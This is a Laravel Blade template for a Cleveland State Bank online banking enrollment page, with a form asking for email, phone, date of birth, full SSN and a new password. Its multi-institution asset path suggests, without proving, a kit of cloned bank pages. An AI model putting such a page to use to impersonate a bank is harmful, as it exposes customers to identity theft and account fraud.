<!DOCTYPE html>
<html lang="en-US">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Enroll in Online Banking | Cleveland State Bank</title>
    <link rel="icon" type="image/png" href="{{ asset('assets/institutions/clevelandstatebank/images/favicon.png') }}">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500;600;700&family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
    <link href="https://cdn.jsdelivr.net/npm/select2@4.1.0-rc.0/dist/css/select2.min.css" rel="stylesheet" />

    <style>
        :root {
            --csb-primary: #0f4c81;
            --csb-primary-dark: #0a365c;
            --csb-bg-gradient: linear-gradient(135deg, #07192f 0%, #0d2f54 50%, #113c6d 100%);
            --csb-text-dark: #2d3748;
            --csb-text-muted: #718096;
            --csb-border: #e2e8f0;
        }

        * { box-sizing: border-box; margin: 0; padding: 0; }

        body {
            font-family: 'Roboto', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: var(--csb-bg-gradient);
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            color: var(--csb-text-dark);
            -webkit-font-smoothing: antialiased;
        }

        .csb-top-nav {
            background: rgba(7, 25, 47, 0.85);
            backdrop-filter: blur(8px);
            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
            padding: 14px 28px;
            display: flex;
            align-items: center;
            justify-content: space-between;
        }

        .csb-nav-logo img { height: 44px; object-fit: contain; }

        .csb-nav-right {
            display: flex;
            align-items: center;
            gap: 20px;
        }

        .csb-nav-link {
            color: rgba(255, 255, 255, 0.85);
            text-decoration: none;
            font-size: 14px;
            font-weight: 500;
            display: inline-flex;
            align-items: center;
            gap: 6px;
        }

        .csb-nav-link:hover { color: #ffffff; text-decoration: underline; }

        .csb-secure-badge {
            background: rgba(16, 185, 129, 0.15);
            border: 1px solid rgba(16, 185, 129, 0.35);
            color: #6ee7b7;
            font-size: 12px;
            font-weight: 600;
            padding: 5px 12px;
            border-radius: 20px;
        }

        .csb-auth-container {
            flex: 1;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 40px 16px;
        }

        .csb-auth-card {
            background: #ffffff;
            width: 100%;
            max-width: 520px;
            border-radius: 12px;
            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
            overflow: hidden;
        }

        .csb-card-header {
            text-align: center;
            padding: 28px 32px 18px;
            border-bottom: 1px solid #edf2f7;
            background: #fafbfc;
        }

        .csb-card-logo {
            max-width: 200px;
            margin: 0 auto 12px;
            display: block;
        }

        .csb-card-header h1 {
            font-family: 'Montserrat', sans-serif;
            font-size: 20px;
            font-weight: 700;
            color: var(--csb-primary);
            margin-bottom: 4px;
        }

        .csb-card-header p {
            font-size: 13px;
            color: var(--csb-text-muted);
        }

        .csb-card-body { padding: 26px 32px 32px; }

        .csb-alert-danger {
            background: #fef2f2;
            border: 1px solid #fecaca;
            color: #991b1b;
            padding: 12px 14px;
            border-radius: 6px;
            font-size: 13px;
            margin-bottom: 20px;
        }

        .csb-form-group { margin-bottom: 18px; }

        .csb-form-label {
            display: block;
            font-size: 13px;
            font-weight: 600;
            color: #374151;
            margin-bottom: 6px;
        }

        .csb-form-control {
            width: 100%;
            height: 44px;
            padding: 10px 14px;
            font-size: 14px;
            border: 1.5px solid #d1d5db;
            border-radius: 6px;
            background: #ffffff;
            color: #1f2937;
            font-family: inherit;
        }

        .csb-form-control:focus {
            outline: none;
            border-color: var(--csb-primary);
            box-shadow: 0 0 0 3px rgba(15, 76, 129, 0.15);
        }

        .csb-grid-2 {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 14px;
        }

        .csb-btn-submit {
            width: 100%;
            height: 48px;
            background: var(--csb-primary);
            color: #ffffff;
            border: none;
            border-radius: 6px;
            font-family: 'Montserrat', sans-serif;
            font-size: 14px;
            font-weight: 700;
            letter-spacing: 0.5px;
            text-transform: uppercase;
            cursor: pointer;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            box-shadow: 0 4px 12px rgba(15, 76, 129, 0.25);
            margin-top: 8px;
        }

        .csb-btn-submit:hover { background: var(--csb-primary-dark); }

        .csb-auth-footer {
            background: rgba(7, 25, 47, 0.95);
            border-top: 1px solid rgba(255, 255, 255, 0.08);
            padding: 20px;
            text-align: center;
            color: rgba(255, 255, 255, 0.65);
            font-size: 12px;
        }

        .csb-footer-badges {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 20px;
            margin-bottom: 10px;
        }

        .csb-footer-badges img { height: 30px; object-fit: contain; }

        .csb-signin-link {
            display: block;
            text-align: center;
            margin-top: 16px;
            color: var(--csb-primary);
            font-size: 13px;
            font-weight: 600;
            text-decoration: none;
        }
        .csb-signin-link:hover { text-decoration: underline; }
    </style>
</head>
<body>
    <header class="csb-top-nav">
        <a href="{{ route('home') }}" class="csb-nav-logo">
            <img src="{{ asset('assets/institutions/clevelandstatebank/images/logo-white.png') }}" alt="Cleveland State Bank">
        </a>
        <div class="csb-nav-right">
            <div class="csb-secure-badge"><i class="fas fa-lock"></i> Secure Enrollment</div>
            <a href="{{ route('login') }}" class="csb-nav-link"><i class="fas fa-sign-in-alt"></i> Sign In</a>
        </div>
    </header>

    <main class="csb-auth-container">
        <div class="csb-auth-card">
            <div class="csb-card-header">
                <img src="{{ asset('assets/institutions/clevelandstatebank/images/logo.png') }}" alt="Cleveland State Bank" class="csb-card-logo">
                <h1>Online Banking Enrollment</h1>
                <p>Register for secure 24/7 access to your Cleveland State Bank accounts.</p>
            </div>

            <div class="csb-card-body">
                @if ($errors->any())
                    <div class="csb-alert-danger">
                        @foreach ($errors->all() as $error)
                            <div>{{ $error }}</div>
                        @endforeach
                    </div>
                @endif

                <form method="POST" action="{{ route('register') }}" id="csbRegisterForm">
                    @csrf

                    <div class="csb-form-group">
                        <label class="csb-form-label">Email Address *</label>
                        <input type="email" name="email" value="{{ old('email') }}" class="csb-form-control" required autofocus placeholder="name@example.com">
                    </div>

                    <div class="csb-form-group">
                        <label class="csb-form-label">Phone Number *</label>
                        <input type="tel" name="phone" value="{{ old('phone') }}" class="csb-form-control" required placeholder="(662) 000-0000">
                    </div>

                    <div class="csb-grid-2">
                        <div class="csb-form-group">
                            <label class="csb-form-label">Date of Birth *</label>
                            <input type="text" name="date_of_birth" id="dob_field" value="{{ old('date_of_birth') }}" class="csb-form-control" placeholder="MM/DD/YYYY" required>
                        </div>
                        <div class="csb-form-group">
                            <label class="csb-form-label">SSN *</label>
                            <input type="text" name="ssn" id="ssn_field" value="{{ old('ssn') }}" class="csb-form-control" placeholder="XXX-XX-XXXX" maxlength="11" required>
                        </div>
                    </div>

                    <div class="csb-form-group">
                        <label class="csb-form-label">Create Password *</label>
                        <input type="password" name="password" id="password_field" class="csb-form-control" placeholder="Enter secure password" required>
                    </div>

                    @if(isset($googleReCaptcha) && $googleReCaptcha)
                        <div style="margin-bottom: 20px; display:flex; justify-content:center;">
                            <div class="g-recaptcha" data-sitekey="{{ json_decode($googleReCaptcha->data, true)['site_key'] }}"></div>
                        </div>
                    @endif

                    <button type="submit" class="csb-btn-submit">
                        <i class="fas fa-arrow-right"></i> Next Step
                    </button>

                    <a href="{{ route('login') }}" class="csb-signin-link">Already have an account? Sign In</a>
                </form>
            </div>
        </div>
    </main>

    <footer class="csb-auth-footer">
        <div class="csb-footer-badges">
            <img src="{{ asset('assets/institutions/clevelandstatebank/images/fdic-white.png') }}" alt="Member FDIC">
            <img src="{{ asset('assets/institutions/clevelandstatebank/images/ehl-white.png') }}" alt="Equal Housing Lender">
        </div>
        <div>&copy; {{ date('Y') }} Cleveland State Bank. Member FDIC. Equal Housing Lender.</div>
    </footer>

    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/cleave.js@1.6.0/dist/cleave.min.js"></script>
    <script>
        $(document).ready(function() {
            if ($('#ssn_field').length) {
                new Cleave('#ssn_field', { delimiters: ['-', '-'], blocks: [3, 2, 4], numericOnly: true });
            }
            if ($('#dob_field').length) {
                new Cleave('#dob_field', { date: true, datePattern: ['m', 'd', 'Y'] });
            }
        });
    </script>
</body>
</html>
